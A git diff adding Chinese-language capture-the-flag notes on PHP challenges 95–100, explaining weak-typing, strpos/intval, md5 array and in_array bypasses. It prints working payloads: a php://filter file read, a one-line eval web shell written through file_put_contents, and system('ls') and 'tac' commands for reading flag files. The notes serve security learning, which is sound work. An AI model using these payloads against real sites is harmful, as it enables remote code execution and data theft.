@@ -69,18 +69,94 @@ pyload=URL/?cmd=%0axaxa%0aphp
 我们的 $num 是 " 010574"，第一个 "0" 在索引 1 的位置（因为前面有一个空格）。
 strpos 返回 1，取反 !1 为 false，所以不会执行 die()。
 `pyload=URL/?num=%20010574`
+加号(%2B)也可以绕过（加号提交过去解码就是空格）
+`pyload=URL/?num=+010574`
+
+**·95**
+![alt text](TU/PHP4x7.png)
+这里的preg_match()过滤**字母**过滤**小数点**
+!strpos()过滤八进制的0
+但是可以使用空格 **%20** 绕过`!strpos()`过滤
+
+`pyload=URL/?num=%20010574`
 
 
+**·96**
+![alt text](TU/PHP4x8.png)
+文件包含漏洞
+**[highlight_file()](https://www.php.net/manual/zh/function.highlight-file.php)**
+highlight_file() 函数用于高亮显示文件内容。
+
+查任意文件以base64编码输出`?u=php://filter/convert.base64-encode/resource=flag.php`
+给绝对路径：`?u=/var/www/html/flag.php`
+相对路径`?u=./flag.php`
+
+**·97**
+![alt text](TU/PHP4x9.png)
+POST传入ab值，ab不等，ab的md5值相等返回flag
+注意这里是`===`
+如果是 `==` 的话, 任意两个字符串加密后生成的 md5 为字符串类型, 以0e开头的字符串比较时会被类型转换为科学计数法, 即 0==0, 返回 true
+但这里是 `===` 的话, 以0e开头的字符串比较时, 不会进行类型转换, 只进行字符串内容的比较。
+
+利用 md5 加密数组时, 会报错并返回 **NULL**
+NULL===NULL 返回 true
+注意： **数组不能为空**
+
+**·98**
+![alt text](TU/PHP4x10.png)
+
+| 三元运算符                                                   | 意思                                                                                               |
+| ------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `xxxxxx?xxxx :xxxx`                                          | `条件 ? 真时执行 : 假时执行;`                                                                      |
+| 引用运算符                                                   |
+| `a = &c`                                                     | `a 是 c 的引用`                                                                                    |
+| 题目                                                         |
+| `$_GET ? $_GET = &$_POST : 'flag';`                          | `如果 $_GET 有值, 则将 $_POST 引用给 $_GET(下面的 $_GET 也会被引用), 否则返回 flag`                |
+| `$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';`              | `如果 $_GET['flag'] 等于 flag, 则将 $_COOKIE 引用给 $_GET(下面的 $_GET 也会被引用), 否则返回 flag` |
+| `$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';`              | `如果 $_GET['flag'] 等于 flag, 则将 $_SERVER 引用给 $_GET(下面的 $_GET 也会被引用), 否则返回 flag` |
+| `highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);` | `如果 $_GET['HTTP_FLAG'] 等于 flag, 则返回 flag, 否则返回 __FILE__`                                |
+![1](TU/PHP4x11.png)
+**GET 随便一个值都可以, 只要保证 POST 的内容是 HTTP_FLAG=flag 即可**
+
+**·99**
+![2](TU/PHP4x12.png)
+
+创建一个叫 $allow 的数组，从 36 循环到 876(0x36d)，每一轮都往数组里加一个1 到当前 $i 的随机数，最终数组里有 841 个随机整数创建一个叫 $allow 的数组，
 
 
+| 函数                                                                                    | 描述                                                                                                      |
+| --------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
+| **[array_push()](https://www.php.net/manual/zh/function.array-push.php)**               | 将一个或多个单元压入数组的末尾（入栈）。                                                                  |
+| **[in_array()](https://www.php.net/manual/zh/function.in-array.php)**                   | 检查数组中是否存在某个值                                                                                  |
+| **[file_put_contents()](https://www.php.net/manual/zh/function.file-put-contents.php)** | 将字符串写入文件。如果 文件名 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。 |
+
+当 n=123 时概率最大, 可以通过 if
+但是我们需要以 n 为文件名写文件, n 的值必须是字符串
+这里考察的是 in_array() 的漏洞 (其实还是弱类型转换)
+```
+var_dump(in_array('1abc', [1,2,3,4,5])); // true
+var_dump(in_array('abc', [1,2,3,4,5])); // false
+var_dump(in_array('abc', [0,1,2,3,4,5])); // true
+```
+
+content=<?php eval($_POST[1]);?>
+1=system('ls');
+1=system('tac flag36d.php');
 
 
+**·100**
+![3](TU/PHP4x13.png)
+**`=` 的优先级大于`and`**
+v1是数字
+v2是字符串
+v3是`;`
 
+pyload=`URL/?v1=1&v2=eval($_POST[1])?>&v3=;`
+在post中给1赋值
+1=system('ls');
+1=system('cat  ctfshow.php');ctrl+u查看源码
 
-
-
-
-
+把`0x2d`--->`-`
 
 
 
